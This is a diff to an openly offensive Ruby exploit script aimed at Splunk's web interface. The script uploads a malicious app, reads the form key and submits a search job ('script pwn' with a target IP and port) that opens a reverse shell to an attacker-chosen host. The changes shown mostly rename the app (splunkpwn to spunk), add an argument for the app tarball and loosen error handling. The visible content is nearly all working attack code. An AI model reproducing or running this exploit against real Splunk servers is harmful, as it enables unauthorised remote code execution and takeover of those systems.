@@ -23,7 +23,7 @@ EOF
 end
 
 def usage
-  puts "splunk <splunk base url> <reverse shell target ip> <reverse shell target port>"
+  puts "spunk <splunk base url> <spunkapp tgz> <reverse shell target ip> <reverse shell target port>"
 end
 
 def log(message)
@@ -38,13 +38,13 @@ end
 
 # get our target details
 host = ARGV.shift
-splunkpwn_app = ARGV.shift
+spunk_app = ARGV.shift
 rhost = ARGV.shift
 rport = ARGV.shift
 
 # define our urls
 search_url = host + '/en-US/app/search/flashtimeline'
-splunkpwn_url = host + '/en-US/app/splunkpwn/flashtimeline'
+spunk_url = host + '/en-US/app/spunk/flashtimeline'
 jobs_url = host + '/en-US/api/search/jobs'
 
 # set up the mechanize browser
@@ -73,14 +73,15 @@ begin
     install_app_page = agent.click(manage_apps_page.link_with(:text => /Install\ app\ from\ file/))
 
     # upload our file
-    log "uploading splunkpwn app"
+    log "uploading spunk app"
     install_app_page.form_with(:method => 'POST') do |upload_form|
-      upload_form.file_uploads.first.file_name = splunkpwn_app
+      upload_form.file_uploads.first.file_name = spunk_app
     end.submit
 
   end
-rescue EOFError => e
+rescue => e
   puts "meh, #{e}"
+  exit
 end
 
 begin
@@ -88,8 +89,8 @@ begin
     # first we need to retrieve the form key
     # FORM_KEY": "463764128146385915
     @form_key = ""
-    agent.get(splunkpwn_url) do |splunkpwn|
-      splunkpwn.body.match(/FORM_KEY":\ "(\d+)"/)
+    agent.get(spunk_url) do |spunk|
+      spunk.body.match(/FORM_KEY":\ "(\d+)"/)
       @form_key = $1
     end
 
@@ -101,8 +102,8 @@ begin
     agent.post(jobs_url, {
         :search => "search foo | script pwn #{rhost} #{rport}",
         :status_buckets => "300",
-        :namespace => "splunkpwn",
-        :ui_dispatch_app => "splunkpwn",
+        :namespace => "spunk",
+        :ui_dispatch_app => "spunk",
         :ui_dispatch_view => "flashtimeline",
         :auto_cancel => "100",
         :required_field_list => "*",
@@ -114,6 +115,6 @@ begin
 
     log "spunked all over it"
 
-rescue EOFError => e
+rescue => e
   puts "oh bugger, #{e}"
 end
